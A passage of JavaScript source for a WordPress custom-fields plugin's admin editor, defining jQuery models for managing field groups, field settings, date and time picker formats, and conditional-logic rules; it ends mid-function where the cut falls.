(function($, undefined){
	
	/**
	*  fieldGroupManager
	*
	*  Generic field group functionality 
	*
	*  @date	15/12/17
	*  @since	5.7.0
	*
	*  @param	void
	*  @return	void
	*/
	
	var fieldGroupManager = new acf.Model({
		
		id: 'fieldGroupManager',
		
		events: {
			'submit #post':					'onSubmit',
			'click a[href="#"]':			'onClick',
			'click .submitdelete': 			'onClickTrash',
		},
		
		filters: {
			'find_fields_args':				'filterFindFieldArgs'
		},
		
		onSubmit: function( e, $el ){
			
			// vars
			var $title = $('#titlewrap #title');
			
			// empty
			if( !$title.val() ) {
				
				// prevent default
				e.preventDefault();
				
				// unlock form
				acf.unlockForm( $el );
				
				// alert
				alert( acf.__('Field group title is required') );
				
				// focus
				$title.focus();
			}
		},
		
		onClick: function( e ){
			e.preventDefault();
		},
		
		onClickTrash: function( e ){
			var result = confirm( acf.__('Move to trash. Are you sure?') );
			if( !result ) {
				e.preventDefault();
			}
		},
		
		filterFindFieldArgs: function( args ){
			args.visible = true;
			return args;
		}
	});
	
	
	/**
	*  screenOptionsManager
	*
	*  Screen options functionality 
	*
	*  @date	15/12/17
	*  @since	5.7.0
	*
	*  @param	void
	*  @return	void
	*/
		
	var screenOptionsManager = new acf.Model({
		
		id: 'screenOptionsManager',
		wait: 'prepare',
		
		events: {
			'change': 'onChange'
		},
		
		initialize: function(){
			
			// vars
			var $div = $('#adv-settings');
			var $append = $('#acf-append-show-on-screen');
			
			// append
			$div.find('.metabox-prefs').append( $append.html() );
			$div.find('.metabox-prefs br').remove();
			
			// clean up
			$append.remove();
			
			// initialize
			this.$el = $('#acf-field-key-hide');
			
			// render
			this.render();
		},
		
		isChecked: function(){
			return this.$el.prop('checked');
		},
		
		onChange: function( e, $el ) {
			var val = this.isChecked() ? 1 : 0;
			acf.updateUserSetting('show_field_keys', val);
			this.render();
		},
		
		render: function(){
			if( this.isChecked() ) {
				$('#acf-field-group-fields').addClass('show-field-keys');
			} else {
				$('#acf-field-group-fields').removeClass('show-field-keys');
			}
		}
		
	});
	
	
	/**
	*  appendFieldManager
	*
	*  Appends fields together
	*
	*  @date	15/12/17
	*  @since	5.7.0
	*
	*  @param	void
	*  @return	void
	*/
	
	var appendFieldManager = new acf.Model({
		
		actions: {
			'new_field' : 'onNewField'
		},
		
		onNewField: function( field ){
			
			// bail ealry if not append
			if( !field.has('append') ) return;
			
			// vars
			var append = field.get('append');
			var $sibling = field.$el.siblings('[data-name="' + append + '"]').first();
			
			// bail early if no sibling
			if( !$sibling.length ) return;
			
			// ul
			var $div = $sibling.children('.acf-input');
			var $ul = $div.children('ul');
			
			// create ul
			if( !$ul.length ) {
				$div.wrapInner('<ul class="acf-hl"><li></li></ul>');
				$ul = $div.children('ul');
			}
			
			// li
			var html = field.$('.acf-input').html();
			var $li = $('<li>' + html + '</li>');
			$ul.append( $li );
			$ul.attr('data-cols', $ul.children().length );
			
			// clean up
			field.remove();
		}
	});
	
})(jQuery);

(function($, undefined){
	
	acf.FieldObject = acf.Model.extend({
		
		// class used to avoid nested event triggers
		eventScope: '.acf-field-object',
		
		// events
		events: {
			'click .edit-field':		'onClickEdit',
			'click .delete-field':		'onClickDelete',
			'click .duplicate-field':	'duplicate',
			'click .move-field':		'move',
			
			'change .field-type':		'onChangeType',
			'change .field-required':	'onChangeRequired',
			'blur .field-label':		'onChangeLabel',
			'blur .field-name':			'onChangeName',
			
			'change':					'onChange',
			'changed':					'onChanged',
		},
		
		// data
		data: {
			
			// Similar to ID, but used for HTML puposes.
			// It is possbile for a new field to have an ID of 0, but an id of 'field_123' */
			id: 0,
			
			// The field key ('field_123')
			key: '',
			
			// The field type (text, image, etc)
			type: '',
			
			// The $post->ID of this field
			//ID: 0,
			
			// The field's parent
			//parent: 0,
			
			// The menu order
			//menu_order: 0
		},
		
		setup: function( $field ){
			
			// set $el
			this.$el = $field;
			
			// inherit $field data (id, key, type)
			this.inherit( $field );
			
			// load additional props
			// - this won't trigger 'changed'
			this.prop('ID');
			this.prop('parent');
			this.prop('menu_order');
		},
		
		$input: function( name ){
			return $('#' + this.getInputId() + '-' + name);
		},
		
		$meta: function(){
			return this.$('.meta:first');
		},
		
		$handle: function(){
			return this.$('.handle:first');
		},
		
		$settings: function(){
			return this.$('.settings:first');
		},
		
		$setting: function( name ){
			return this.$('.acf-field-settings:first > .acf-field-setting-' + name);
		},
		
		getParent: function(){
			return acf.getFieldObjects({ child: this.$el, limit: 1 }).pop();
		},
		
		getParents: function(){
			return acf.getFieldObjects({ child: this.$el });
		},
		
		getFields: function(){
			return acf.getFieldObjects({ parent: this.$el });
		},
		
		getInputName: function(){
			return 'acf_fields[' + this.get('id') + ']';
		},
		
		getInputId: function(){
			return 'acf_fields-' + this.get('id');
		},
		
		newInput: function( name, value ){
			
			// vars
			var inputId = this.getInputId();
			var inputName = this.getInputName();
			
			// append name
			if( name ) {
				inputId += '-'+name;
				inputName += '['+name+']';
			}
			
			// create input (avoid HTML + JSON value issues)
			var $input = $('<input />').attr({
				id: inputId,
				name: inputName,
				value: value
			});
			this.$('> .meta').append( $input );
			
			// return
			return $input;
		},
		
		getProp: function( name ){
			
			// check data
			if( this.has(name) ) {
				return this.get(name);
			}
			
			// get input value
			var $input = this.$input( name );
			var value = $input.length ? $input.val() : null;
			
			// set data silently (cache)
			this.set(name, value, true);
			
			// return
			return value;
		},
		
		setProp: function( name, value ) {
			
			// get input
			var $input = this.$input( name );
			var prevVal = $input.val();
			
			// create if new
			if( !$input.length ) {
				$input = this.newInput( name, value );
			}
			
			// remove
			if( value === null ) {
				$input.remove();
				
			// update
			} else {
				$input.val( value );	
			}
			
			//console.log('setProp', name, value, this);
			
			// set data silently (cache)
			if( !this.has(name) ) {
				//console.log('setting silently');
				this.set(name, value, true);
				
			// set data allowing 'change' event to fire
			} else {
				//console.log('setting loudly!');
				this.set(name, value);
			}
			
			// return
			return this;
			
		},
		
		prop: function( name, value ){
			if( value !== undefined ) {
				return this.setProp( name, value );
			} else {
				return this.getProp( name );
			}
		},
		
		props: function( props ){
			Object.keys( props ).map(function( key ){
				this.setProp( key, props[key] );
			}, this);
		},
		
		getLabel: function(){
			
			// get label with empty default
			var label = this.prop('label');
			if( label === '' ) {
				label = acf.__('(no label)')
			}
			
			// return
			return label;
		},
		
		getName: function(){
			return this.prop('name');
		},
		
		getType: function(){
			return this.prop('type');
		},
		
		getTypeLabel: function(){
			var type = this.prop('type');
			var types = acf.get('fieldTypes');
			return ( types[type] ) ? types[type].label : type;
		},
		
		getKey: function(){
			return this.prop('key');
		},
			
		initialize: function(){
			// do nothing
		},
		
		render: function(){
					
			// vars
			var $handle = this.$('.handle:first');
			var menu_order = this.prop('menu_order');
			var label = this.getLabel();
			var name = this.prop('name');
			var type = this.getTypeLabel();
			var key = this.prop('key');
			var required = this.$input('required').prop('checked');
			
			// update menu order
			$handle.find('.acf-icon').html( parseInt(menu_order) + 1 );
			
			// update required
			if( required ) {
				label += ' <span class="acf-required">*</span>';
			}
			
			// update label
			$handle.find('.li-field-label strong a').html( label );
						
			// update name
			$handle.find('.li-field-name').text( name );
			
			// update type
			$handle.find('.li-field-type').text( type );
			
			// update key
			$handle.find('.li-field-key').text( key );
			
			// action for 3rd party customization
			acf.doAction('render_field_object', this);
		},
		
		refresh: function(){
			acf.doAction('refresh_field_object', this);
		},
		
		isOpen: function() {
			return this.$el.hasClass('open');
		},
		
		onClickEdit: function( e ){
			this.isOpen() ? this.close() : this.open();
		},
		
		open: function(){
			
			// vars
			var $settings = this.$el.children('.settings');
			
			// open
			$settings.slideDown();
			this.$el.addClass('open');
			
			// action (open)
			acf.doAction('open_field_object', this);
			this.trigger('openFieldObject');
			
			// action (show)
			acf.doAction('show', $settings);
		},
		
		close: function(){
			
			// vars
			var $settings = this.$el.children('.settings');
			
			// close
			$settings.slideUp();
			this.$el.removeClass('open');
			
			// action (close)
			acf.doAction('close_field_object', this);
			this.trigger('closeFieldObject');
			
			// action (hide)
			acf.doAction('hide', $settings);
		},
		
		serialize: function(){
			return acf.serialize( this.$el, this.getInputName() );
		},
		
		save: function( type ){
			
			// defaults
			type = type || 'settings'; // meta, settings
			
			// vars
			var save = this.getProp('save');
			
			// bail if already saving settings
			if( save === 'settings' ) {
				return;
			}
			
			// prop
			this.setProp('save', type);
			
			// debug
			this.$el.attr('data-save', type);
			
			// action
			acf.doAction('save_field_object', this, type);
		},
		
		submit: function(){
			
			// vars
			var inputName = this.getInputName();
			var save = this.get('save');
			
			// close
			if( this.isOpen() ) {
				this.close();
			}
			
			// allow all inputs to save
			if( save == 'settings' ) {
				// do nothing
			
			// allow only meta inputs to save	
			} else if( save == 'meta' ) {
				this.$('> .settings [name^="' + inputName + '"]').remove();
				
			// prevent all inputs from saving
			} else {
				this.$('[name^="' + inputName + '"]').remove();
			}
			
			// action
			acf.doAction('submit_field_object', this);
		},
		
		onChange: function( e, $el ){
			
			// save settings
			this.save();
			
			// action for 3rd party customization
			acf.doAction('change_field_object', this);
		},
		
		onChanged: function( e, $el, name, value ){
			
			// ignore 'save'
			if( name == 'save' ) {
				return;
			}
			
			// save meta
			if( ['menu_order', 'parent'].indexOf(name) > -1 ) {
				this.save('meta');
			
			// save field
			} else {
				this.save();
			}			
			
			// render
			if( ['menu_order', 'label', 'required', 'name', 'type', 'key'].indexOf(name) > -1 ) {
				this.render();
			}
						
			// action for 3rd party customization
			acf.doAction('change_field_object_' + name, this, value);
		},
		
		onChangeLabel: function( e, $el ){
			
			// set
			var label = $el.val();
			this.set('label', label);
			
			// render name
			if( this.prop('name') == '' ) {
				var name = acf.applyFilters('generate_field_object_name', acf.strSanitize(label), this);
				this.prop('name', name);
			}
		},
		
		onChangeName: function( e, $el){
			
			// set
			var name = $el.val();
			this.set('name', name);
			
			// error
			if( name.substr(0, 6) === 'field_' ) {
				alert( acf.__('The string "field_" may not be used at the start of a field name') );
			}
		},
		
		onChangeRequired: function( e, $el ){
			
			// set
			var required = $el.prop('checked') ? 1 : 0;
			this.set('required', required);
		},
		
		delete: function( args ){
			
			// defaults
			args = acf.parseArgs(args, {
				animate: true
			});
			
			// add to remove list
			var id = this.prop('ID');
			
			if( id ) {
				var $input = $('#_acf_delete_fields');
				var newVal = $input.val() + '|' + id;
				$input.val( newVal );
			}
			
			// action
			acf.doAction('delete_field_object', this);
			
			// animate
			if( args.animate ) {
				this.removeAnimate();
			} else {
				this.remove();
			}
		},
		
		onClickDelete: function( e, $el ){
			
			// Bypass confirmation when holding down "shift" key.
			if( e.shiftKey ) {
				return this.delete();
			}

			// add class
			this.$el.addClass('-hover');
			
			// add tooltip
			var tooltip = acf.newTooltip({
				confirmRemove: true,
				target: $el,
				context: this,
				confirm: function(){
					this.delete();
				},
				cancel: function(){
					this.$el.removeClass('-hover');
				}
			});
		},
		
		removeAnimate: function(){
			
			// vars
			var field = this;
			var $list = this.$el.parent();
			var $fields = acf.findFieldObjects({
				sibling: this.$el
			});
			
			// remove
			acf.remove({
				target: this.$el,
				endHeight: $fields.length ? 0 : 50,
				complete: function(){
					field.remove();
					acf.doAction('removed_field_object', field, $list);
				}
			});
			
			// action
			acf.doAction('remove_field_object', field, $list);
		},
		
		duplicate: function(){
			
			// vars
			var newKey = acf.uniqid('field_');
			
			// duplicate
			var $newField = acf.duplicate({
				target: this.$el,
				search: this.get('id'),
				replace: newKey,
			});
			
			// set new key
			$newField.attr('data-key', newKey);
			
			// get instance
			var newField = acf.getFieldObject( $newField );
			
			// open / close
			if( this.isOpen() ) {
				this.close();
			} else {
				newField.open();
			}
			
			// focus label
			var $label = newField.$setting('label input');
			setTimeout(function(){
	        	$label.focus();
	        }, 251);
			
			// update newField label / name
			var label = newField.prop('label');
			var name = newField.prop('name');
			var end = name.split('_').pop();
			var copy = acf.__('copy');
			
			// increase suffix "1"
			if( $.isNumeric(end) ) {
				var i = (end*1) + 1;
				label = label.replace( end, i );
				name = name.replace( end, i );
			
			// increase suffix "(copy1)"
			} else if( end.indexOf(copy) === 0 ) {
				var i = end.replace(copy, '') * 1;
				i = i ? i+1 : 2;
				
				// replace
				label = label.replace( end, copy + i );
				name = name.replace( end, copy + i );
			
			// add default "(copy)"
			} else {
				label += ' (' + copy + ')';
				name += '_' + copy;
			}
			
			newField.prop('ID', 0);
			newField.prop('label', label);
			newField.prop('name', name);
			newField.prop('key', newKey);
			
			// action
			acf.doAction('duplicate_field_object', this, newField);
			acf.doAction('append_field_object', newField);
		},
		
		wipe: function(){
			
			// vars
			var prevId = this.get('id');
			var prevKey = this.get('key');
			var newKey = acf.uniqid('field_');
			
			// rename
			acf.rename({
				target: this.$el,
				search: prevId,
				replace: newKey,
			});
			
			// data
			this.set('id', newKey);
			this.set('prevId', prevId);
			this.set('prevKey', prevKey);
			
			// props
			this.prop('key', newKey);
			this.prop('ID', 0);
			
			// attr
			this.$el.attr('data-key', newKey);
			this.$el.attr('data-id', newKey);
			
			// action
			acf.doAction('wipe_field_object', this);
		},
		
		move: function(){
			
			// helper
			var hasChanged = function( field ){
				return (field.get('save') == 'settings');
			};
			
			// vars
			var changed = hasChanged(this);
			
			// has sub fields changed
			if( !changed ) {
				acf.getFieldObjects({
					parent: this.$el
				}).map(function( field ){
					changed = hasChanged(field) || field.changed;
				});
			}
			
			// bail early if changed
			if( changed ) {
				alert( acf.__('This field cannot be moved until its changes have been saved') );
				return;
			}
			
			// step 1.
			var id = this.prop('ID');
			var field = this;
			var popup = false;
			var step1 = function(){
				
				// popup
				popup = acf.newPopup({
					title: acf.__('Move Custom Field'),
					loading: true,
					width: '300px'
				});
				
				// ajax
				var ajaxData = {
					action:		'acf/field_group/move_field',
					field_id:	id
				};
				
				// get HTML
				$.ajax({
					url: acf.get('ajaxurl'),
					data: acf.prepareForAjax(ajaxData),
					type: 'post',
					dataType: 'html',
					success: step2
				});
			};
			
			var step2 = function( html ){
				
				// update popup
				popup.loading(false);
				popup.content(html);
				
				// submit form
				popup.on('submit', 'form', step3);
			};
			
			var step3 = function( e, $el ){
				
				// prevent
				e.preventDefault();
				
				// disable
				acf.startButtonLoading( popup.$('.button') );
				
				// ajax
				var ajaxData = {
					action: 'acf/field_group/move_field',
					field_id: id,
					field_group_id: popup.$('select').val()
				};
				
				// get HTML
				$.ajax({
					url: acf.get('ajaxurl'),
					data: acf.prepareForAjax(ajaxData),
					type: 'post',
					dataType: 'html',
					success: step4
				});
			};
			
			var step4 = function( html ){
				
				// update popup
				popup.content(html);
				
				// remove element
				field.removeAnimate();
			};
			
			// start
			step1();
			
		},
		
		onChangeType: function( e, $el ){
			
			// clea previous timout
			if( this.changeTimeout ) {
				clearTimeout(this.changeTimeout);
			}
			
			// set new timeout
			// - prevents changing type multiple times whilst user types in newType
			this.changeTimeout = this.setTimeout(function(){
				this.changeType( $el.val() );
			}, 300);
		},
		
		changeType: function( newType ){
			
			// vars
			var prevType = this.prop('type');
			var prevClass = acf.strSlugify( 'acf-field-object-' + prevType );
			var newClass = acf.strSlugify( 'acf-field-object-' + newType );
			
			// update props
			this.$el.removeClass(prevClass).addClass(newClass);
			this.$el.attr('data-type', newType);
			this.$el.data('type', newType);
			
			// abort XHR if this field is already loading AJAX data
			if( this.has('xhr') ) {
				this.get('xhr').abort();
			}
			
			// store settings
			var $tbody = this.$('> .settings > table > tbody');
			var $settings = $tbody.children('[data-setting="' + prevType + '"]');			
			this.set( 'settings-' + prevType, $settings );
			$settings.detach();
						
			// show settings
			if( this.has('settings-' + newType) ) {
				var $newSettings = this.get('settings-' + newType);
				this.$setting('conditional_logic').before( $newSettings );
				this.set('type', newType);
				//this.refresh();
				return;
			}
			
			// load settings
			var $loading = $('<tr class="acf-field"><td class="acf-label"></td><td class="acf-input"><div class="acf-loading"></div></td></tr>');
			this.$setting('conditional_logic').before( $loading );
			
			// ajax
			var ajaxData = {
				action: 'acf/field_group/render_field_settings',
				field: this.serialize(),
				prefix: this.getInputName()
			};			
			
			// ajax
			var xhr = $.ajax({
				url: acf.get('ajaxurl'),
				data: acf.prepareForAjax(ajaxData),
				type: 'post',
				dataType: 'html',
				context: this,
				success: function( html ){
					
					// bail early if no settings
					if( !html ) return;
					
					// append settings
					$loading.after( html );
					
					// events
					acf.doAction('append', $tbody);
				},
				complete: function(){
					// also triggered by xhr.abort();
					$loading.remove();
					this.set('type', newType);
					//this.refresh();
				}
			});
			
			// set
			this.set('xhr', xhr);
			
		},
		
		updateParent: function(){
			
			// vars
			var ID = acf.get('post_id');
			
			// check parent
			var parent = this.getParent();
			if( parent ) {
				ID = parseInt(parent.prop('ID')) || parent.prop('key');
			}
			
			// update
			this.prop('parent', ID);
		}
				
	});
	
})(jQuery);

(function($, undefined){
	
	/**
	*  mid
	*
	*  Calculates the model ID for a field type
	*
	*  @date	15/12/17
	*  @since	5.6.5
	*
	*  @param	string type
	*  @return	string
	*/
	
	var modelId = function( type ) {
		return acf.strPascalCase( type || '' ) + 'FieldSetting';
	};
	
	/**
	*  registerFieldType
	*
	*  description
	*
	*  @date	14/12/17
	*  @since	5.6.5
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	acf.registerFieldSetting = function( model ){
		var proto = model.prototype;
		var mid = modelId(proto.type + ' ' + proto.name);
		this.models[ mid ] = model;
	};
	
	/**
	*  newField
	*
	*  description
	*
	*  @date	14/12/17
	*  @since	5.6.5
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	acf.newFieldSetting = function( field ){
		
		// vars
		var type = field.get('setting') || '';
		var name = field.get('name') || '';
		var mid = modelId( type + ' ' + name );
		var model = acf.models[ mid ] || null;
		
		// bail ealry if no setting
		if( model === null ) return false;
		
		// instantiate
		var setting = new model( field );
		
		// return
		return setting;
	};
	
	/**
	*  acf.getFieldSetting
	*
	*  description
	*
	*  @date	19/4/18
	*  @since	5.6.9
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	acf.getFieldSetting = function( field ) {
		
		// allow jQuery
		if( field instanceof jQuery ) {
			field = acf.getField(field);
		}
		
		// return
		return field.setting;
	};
	
	/**
	*  settingsManager
	*
	*  description
	*
	*  @date	6/1/18
	*  @since	5.6.5
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	var settingsManager = new acf.Model({
		actions: {
			'new_field': 'onNewField'
		},
		onNewField: function( field ){
			field.setting = acf.newFieldSetting( field );
		}
	});
	
	/**
	*  acf.FieldSetting
	*
	*  description
	*
	*  @date	6/1/18
	*  @since	5.6.5
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	acf.FieldSetting = acf.Model.extend({

		field: false,
		type: '',
		name: '',
		wait: 'ready',
		eventScope: '.acf-field',
		
		events: {
			'change': 'render'
		},
		
		setup: function( field ){
			
			// vars
			var $field = field.$el;
			
			// set props
			this.$el = $field;
			this.field = field;
			this.$fieldObject = $field.closest('.acf-field-object');
			this.fieldObject = acf.getFieldObject( this.$fieldObject );
			
			// inherit data
			$.extend(this.data, field.data);
		},
		
		initialize: function(){
			this.render();
		},
		
		render: function(){
			// do nothing
		}
	});
	
	/*
	*  Date Picker
	*
	*  This field type requires some extra logic for its settings
	*
	*  @type	function
	*  @date	24/10/13
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	var DisplayFormatFieldSetting = acf.FieldSetting.extend({
		type: '',
		name: '',
		render: function(){
			var $input = this.$('input[type="radio"]:checked');
			if( $input.val() != 'other' ) {
				this.$('input[type="text"]').val( $input.val() );
			}
		}
	});
	
	var DatePickerDisplayFormatFieldSetting = DisplayFormatFieldSetting.extend({
		type: 'date_picker',
		name: 'display_format'
	});
	
	var DatePickerReturnFormatFieldSetting = DisplayFormatFieldSetting.extend({
		type: 'date_picker',
		name: 'return_format'
	});
	
	acf.registerFieldSetting( DatePickerDisplayFormatFieldSetting );
	acf.registerFieldSetting( DatePickerReturnFormatFieldSetting );
	
	/*
	*  Date Time Picker
	*
	*  This field type requires some extra logic for its settings
	*
	*  @type	function
	*  @date	24/10/13
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	var DateTimePickerDisplayFormatFieldSetting = DisplayFormatFieldSetting.extend({
		type: 'date_time_picker',
		name: 'display_format'
	});
	
	var DateTimePickerReturnFormatFieldSetting = DisplayFormatFieldSetting.extend({
		type: 'date_time_picker',
		name: 'return_format'
	});
	
	acf.registerFieldSetting( DateTimePickerDisplayFormatFieldSetting );
	acf.registerFieldSetting( DateTimePickerReturnFormatFieldSetting );
	
	/*
	*  Time Picker
	*
	*  This field type requires some extra logic for its settings
	*
	*  @type	function
	*  @date	24/10/13
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	var TimePickerDisplayFormatFieldSetting = DisplayFormatFieldSetting.extend({
		type: 'time_picker',
		name: 'display_format'
	});
	
	var TimePickerReturnFormatFieldSetting = DisplayFormatFieldSetting.extend({
		name: 'time_picker',
		name: 'return_format'
	});
	
	acf.registerFieldSetting( TimePickerDisplayFormatFieldSetting );
	acf.registerFieldSetting( TimePickerReturnFormatFieldSetting );
	
})(jQuery);

(function($, undefined){
	
	/**
	*  ConditionalLogicFieldSetting
	*
	*  description
	*
	*  @date	3/2/18
	*  @since	5.6.5
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	var ConditionalLogicFieldSetting = acf.FieldSetting.extend({
		type: '',
		name: 'conditional_logic',
		events: {
			'change .conditions-toggle': 		'onChangeToggle',
			'click .add-conditional-group': 	'onClickAddGroup',
			'focus .condition-rule-field': 		'onFocusField',
			'change .condition-rule-field': 	'onChangeField',
			'change .condition-rule-operator': 	'onChangeOperator',
			'click .add-conditional-rule':		'onClickAdd',
			'click .remove-conditional-rule':	'onClickRemove'
		},
		
		$rule: false,
		
		scope: function( $rule ){
			this.$rule = $rule;
			return this;
		},
		
		ruleData: function( name, value ){
			return this.$rule.data.apply( this.$rule, arguments );
		},
		
		$input: function( name ){
			return this.$rule.find('.condition-rule-' + name);
		},
		
		$td: function( name ){
			return this.$rule.find('td.' + name);
		},
		
		$toggle: function(){
			return this.$('.conditions-toggle');
		},
		
		$control: function(){
			return this.$('.rule-groups');
		},
		
		$groups: function(){
			return this.$('.rule-group');
		},
		
		$rules: function(){
			return this.$('.rule');
		},
		
		open: function(){
			var $div = this.$control();
			$div.show();
			acf.enable( $div );
		},
		
		close: function(){
			var $div = this.$control();
			$div.hide();
			acf.disable( $div );
		},
		
		render: function(){
			
			// show
			if( this.$toggle().prop('checked') ) {
				this.renderRules();
				this.open();
			
			// hide
			} else {
				this.close();
			}
		},
		
		renderRules: function(){
			
			// vars
			var self = this;
			
			// loop
			this.$rules().each(function(){
				self.renderRule( $(this) );
			});
		},
		
		renderRule: function( $rule ){
			this.scope( $rule );
			this.renderField();
			this.renderOperator();
			this.renderValue();
		},
		
		renderField: function(){
			
			// vars
			var choices = [];
			var validFieldTypes = [];
			var cid = this.fieldObject.cid;
			var $select = this.$input('field');
			
			// loop
			acf.getFieldObjects().map(function( fieldObject ){
				
				// vars
				var choice = {
					id:		fieldObject.getKey(),
					text:	fieldObject.getLabel()
				};
				
				// bail early if is self
				if( fieldObject.cid === cid  ) {
					choice.text += acf.__('(this field)');
					choice.disabled = true;
				}
				
				// get selected field conditions 
				var conditionTypes = acf.getConditionTypes({
					fieldType: fieldObject.getType()
				});
				
				// bail early if no types
				if( !conditionTypes.length ) {
					choice.disabled = true;
				}
				
				// calulate indents
				var indents = fieldObject.getParents().length;
				choice.text = '- '.repeat(indents) + choice.text;
				
				// append
				choices.push(choice);
			});
			
			// allow for scenario where only one field exists
			if( !choices.length ) {
				choices.push({
					id: '',
					text: acf.__('No toggle fields available'),
				});
			}
			
			// render
			acf.renderSelect( $select, choices );
			
			// set
			this.ruleData('field', $select.val());
		},
		
		renderOperator: function(){
			
			// bail early if no field selected
			if( !this.ruleData('field') ) {
				return;
			}
			
			// vars
			var $select = this.$input('operator');
			var val = $select.val();
			var choices = [];
			
			// set saved value on first render
			// - this allows the 2nd render to correctly select an option
			if( $select.val() === null ) {
				acf.renderSelect($select, [{
					id: this.ruleData('operator'),
					text: ''
				}]);
			}
			
			// get selected field
			var $field = acf.findFieldObject( this.ruleData('field') );
			var field = acf.getFieldObject( $field );
			
			// get selected field conditions 
			var conditionTypes = acf.getConditionTypes({
				fieldType: field.getType()
			});
			
			// html
			conditionTypes.map(function( model ){
				choices.push({
					id:		model.prototype.operator,
					text:	model.prototype.label
				});
			});
			
			// render
			acf.renderSelect( $select, choices );
			
			// set
			this.ruleData('operator', $select.val());
		},
		
		renderValue: function(){
			
			// bail early if no field selected
			if( !this.ruleData('field') || !this.ruleData('operator') ) {
				return;
			}
			
			// vars
			var $select = this.$input('value');
			var $td = this.$td('value');
			var val = $select.val();
			
			// get selected field
			var $field = acf.findFieldObject( this.ruleData('field') );
			var field = acf.getFieldObject( $field );
			
			// get selected field conditions
			var conditionTypes = acf.getConditionTypes({
				fieldType: field.getType(),
				operator: this.ruleData('operator')
			});
			
			// html
			var conditionType = conditionTypes[0].prototype;
			var choices = conditionType.choices( field );
			
			// create html: array
			if( choices instanceof Array ) {
				var $newSelect = $('<select></select>');
				acf.renderSelect( $newSelect, choices );
			
			// create html: string (<input />)
			} else {
				var $newSelect = $(choices);
			}
			
			// append
			$select.detach();
			$td.html( $newSelect );
			
			// copy attrs
			// timeout needed to avoid browser bug where "disabled" attribute is not applied
			setTimeout(function(){
				['class', 'name', 'id'].map(function( attr ){
					$newSelect.attr( attr, $select.attr(attr));
				});
			}, 0);
			
			// select existing value (if not a disabled input)
			if( !$newSelect.prop('disabled') ) {
				acf.val( $newSelect, val, true );
			}
			
			// set
			this.ruleData('value', $newSelect.val());
		},
		
		onChangeToggle: function(){
			this.render();
		},
		
		onClickAddGroup: function( e, $el ){
			this.addGroup();
		},
		
		addGroup: function(){
			
			// vars
			var $group = this.$('.rule-group:last');
			
			// duplicate
			var $group2 = acf.duplicate( $group );
			
			// update h4
			$group2.find('h4').text( acf.__('or') );
			
			// remove all tr's except the first one
			$group2.find('tr').not(':first').remove();
			
			// save field
			this.fieldObject.save();
		},
		
		onFocusField: function( e, $el ){
			this.renderField();
		},
		
		onChangeField: function( e, $el ){
			
			// scope
			this.scope( $el.closest('.rule') );
			
			// set data
			this.ruleData('field', $el.val());
			
			// render
			this.renderOperator();
			this.renderValue();
		},
		
		onChangeOperator: function( e, $el ){
			
			// scope
			this.scope( $el.closest('.rule') );
			
			// set data
			this.ruleData('operator', $el.val());
			
			// render
			this.renderValue();
		},
		
		onClickAdd: function( e, $el ){
			
			// duplciate
			var $rule = acf.duplicate( $el.closest('.rule') );
			
			// render
			this.renderRule( $rule );
		},
		
		onClickRemove: function( e, $el ){
			
			// vars
			var $rule = $el.closest('.rule');
			
			// save field
			this.fieldObject.save();
			
			// remove group
			if( $rule.siblings('.rule').length == 0 ) {
				$rule.closest('.rule-group').remove();
			}
			
			// remove
			$rule.remove();
		}
	});
	
	acf.registerFieldSetting( ConditionalLogicFieldSetting );
	
	
	/**
	*  conditionalLogicHelper
	*
	*  description
	*
	*  @date	20/4/18
	*  @since	5.6.9
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	var conditionalLogicHelper = new acf.Model({
		actions: {
			'duplicate_field_objects':	'onDuplicateFieldObjects',
		},
		
		onDuplicateFieldObjects: function( children, newField, prevField ){
			
			// vars
			var data = {};
			var $selects = $();
			
			// reference change in key
			children.map(function( child ){
				
				// store reference of changed key
				data[ child.get('prevKey') ] = child.get('key');
				
				// append condition select
				$selects = $selects.add( child.$('.condition-rule-field') );
			});
			
			// loop
	    	$selects.each(function(){
		    	
		    	// vars
		    	var $select = $(this);
		    	var val = $select.val();
		    	
		    	// bail early if val is not a ref key
		    	if( !val || !data[val] ) {
			    	return;
		    	}
		    	
		    	// modify selected option
		    	$select.find('option:selected').attr('value', data[val]);
		    	
		    	// set new val
		    	$select.val( data[val] );
		    	
	    	});
		},
	});
})(jQuery);

(function($, undefined){
	
	/**
	*  acf.findFieldObject
	*
	*  Returns a single fieldObject $el for a given field key
	*
	*  @date	1/2/18
	*  @since	5.7.0
	*
	*  @param	string key The field key
	*  @return	jQuery
	*/
	
	acf.findFieldObject = function( key ){
		return acf.findFieldObjects({
			key: key,
			limit: 1
		});
	};
	
	/**
	*  acf.findFieldObjects
	*
	*  Returns an array of fieldObject $el for the given args
	*
	*  @date	1/2/18
	*  @since	5.7.0
	*
	*  @param	object args
	*  @return	jQuery
	*/
	
	acf.findFieldObjects = function( args ){
		
		// vars
		args = args || {};
		var selector = '.acf-field-object';
		var $fields = false;
		
		// args
		args = acf.parseArgs(args, {
			id: '',
			key: '',
			type: '',
			limit: false,
			list: null,
			parent: false,
			sibling: false,
			child: false,
		});
		
		// id
		if( args.id ) {
			selector += '[data-id="' + args.id + '"]';
		}
		
		// key
		if( args.key ) {
			selector += '[data-key="' + args.key + '"]';
		}
		
		// type
		if( args.type ) {
			selector += '[data-type="' + args.type + '"]';
		}
		
		// query
		if( args.list ) {
			$fields = args.list.children( selector );
		} else if( args.parent ) {
			$fields = args.parent.find( selector );
		} else if( args.sibling ) {
			$fields = args.sibling.siblings( selector );
		} else if( args.child ) {
			$fields = args.child.parents( selector );
		} else {
			$fields = $( selector );
		}
		
		// limit
		if( args.limit ) {
			$fields = $fields.slice( 0, args.limit );
		}
		
		// return
		return $fields;
	};
	
	/**
	*  acf.getFieldObject
	*
	*  Returns a single fieldObject instance for a given $el|key
	*
	*  @date	1/2/18
	*  @since	5.7.0
	*
	*  @param	string|jQuery $field The field $el or key
	*  @return	jQuery
	*/
	
	acf.getFieldObject = function( $field ){
		
		// allow key
		if( typeof $field === 'string' ) {
